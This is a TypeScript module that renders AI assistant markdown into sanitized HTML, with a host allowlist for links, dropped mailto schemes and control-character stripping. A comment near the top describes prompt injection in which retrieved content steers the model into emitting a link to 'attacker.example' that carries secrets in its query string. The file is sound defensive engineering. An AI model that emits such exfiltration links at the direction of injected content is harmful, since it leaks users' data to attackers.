import { marked } from 'marked';
import sanitizeHtml from 'sanitize-html';

marked.setOptions({
	gfm: true,
	breaks: true,
});

const ALLOWED_TAGS = [
	'p',
	'br',
	'strong',
	'em',
	'del',
	'code',
	'pre',
	'h1',
	'h2',
	'h3',
	'h4',
	'h5',
	'h6',
	'ul',
	'ol',
	'li',
	'blockquote',
	'a',
	'table',
	'thead',
	'tbody',
	'tr',
	'th',
	'td',
	'hr',
	'span',
	'div',
];

/**
 * Hosts an assistant message may link to.
 *
 * Untrusted markdown — model output — is rendered through `{@html}`, so an `<a>`
 * is a channel and its query string is the payload. `img` is deliberately absent
 * from ALLOWED_TAGS, which closes the automatic-beacon vector; a link still
 * requires a click, but retrieved content can steer the model into emitting
 * `[details](https://attacker.example/?d=…)` with something worth exfiltrating
 * in the query.
 *
 * This is an allowlist rather than a blocklist because the set of hosts a
 * grounded assistant has any business linking to is small and knowable. It cites
 * project documentation through relative `/docs/...` paths, which are unaffected
 * — only absolute URLs are checked.
 *
 * A non-allowlisted link keeps its visible text and loses its href. Dropping the
 * text as well would let injected content silently delete parts of an answer,
 * which is a worse failure than a dead link.
 */
const TRUSTED_LINK_HOSTS = new Set([
	'developer.mozilla.org',
	'github.com',
	'modelcontextprotocol.io',
	'svelte.dev',
	'kit.svelte.dev',
	'vercel.com',
	'www.w3.org',
]);

export interface RenderMarkdownOptions {
	/**
	 * Treat the source as untrusted. ON for anything a model produced.
	 *
	 * Default is `true` — deny by default. The two callers rendering
	 * human-authored content (desk help, blog bodies) opt out explicitly, so a
	 * future AI surface that forgets to think about this gets the safe behaviour
	 * rather than the permissive one.
	 */
	untrusted?: boolean;
}

function isTrustedHref(href: string): boolean {
	// Relative and same-origin paths are not absolute URLs and never reach here.
	try {
		return TRUSTED_LINK_HOSTS.has(new URL(href).hostname.toLowerCase());
	} catch {
		return false;
	}
}

function buildOptions(untrusted: boolean): sanitizeHtml.IOptions {
	return {
		allowedTags: ALLOWED_TAGS,
		allowedAttributes: {
			a: ['href', 'target', 'rel'],
			'*': ['class'],
		},
		// `mailto:` is dropped for untrusted content: a mailto href carries
		// `?subject=` and `?body=`, which is the same exfiltration shape as an
		// http query string wearing a different scheme.
		allowedSchemes: untrusted ? ['http', 'https'] : ['http', 'https', 'mailto'],
		allowedSchemesAppliedToAttributes: ['href'],
		allowProtocolRelative: false,
		disallowedTagsMode: 'discard',
		transformTags: {
			// External links open in a new tab with noopener+noreferrer (anti-tabnabbing).
			// Internal/relative links (e.g. Vely's own `/docs/...` references) stay in the
			// same tab so SvelteKit client-routes them — and the chatbot can minimize as the
			// destination page takes over. Only absolute http(s) URLs are treated as external.
			a: (_tagName, attribs) => {
				const href = attribs.href ?? '';
				if (/^https?:\/\//i.test(href)) {
					if (untrusted && !isTrustedHref(href)) {
						// Keep the text, drop the link. `span` survives ALLOWED_TAGS, so the
						// words stay exactly where the author put them.
						return { tagName: 'span', attribs: {} };
					}
					return {
						tagName: 'a',
						attribs: { ...attribs, rel: 'noopener noreferrer', target: '_blank' },
					};
				}
				const { target: _dropTarget, ...rest } = attribs;
				return { tagName: 'a', attribs: rest };
			},
		},
	};
}

const UNTRUSTED_OPTIONS = buildOptions(true);
const AUTHORED_OPTIONS = buildOptions(false);

/**
 * Strip control characters before sanitisation, closing the historical
 * control-char-in-href bypass class (a NUL inside the scheme).
 *
 * Tab (09), newline (0A) and carriage return (0D) are deliberately KEPT.
 * Markdown block structure is made of them: stripping the whole 00-1F range
 * collapsed every list, heading and fenced block into one run-on paragraph, so
 * an assistant's entire answer rendered as a single line of prose.
 *
 * Keeping them does not reopen the bypass. A link destination containing raw
 * whitespace is not a link at all - CommonMark ends the destination at the
 * first space, tab or newline, so the scheme never becomes an href. Pinned by
 * test rather than trusted.
 */
// biome-ignore lint/suspicious/noControlCharactersInRegex: intentional - this regex strips control characters before HTML sanitisation
const CONTROL_CHARS_RE = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g;

/** Parse markdown to sanitized HTML. Sync, safe for chat rendering. SSR-compatible. */
export function renderMarkdown(source: string, options: RenderMarkdownOptions = {}): string {
	const untrusted = options.untrusted ?? true;
	const cleaned = source.replace(CONTROL_CHARS_RE, '');
	const html = marked.parse(cleaned, { async: false }) as string;
	return sanitizeHtml(html, untrusted ? UNTRUSTED_OPTIONS : AUTHORED_OPTIONS);
}
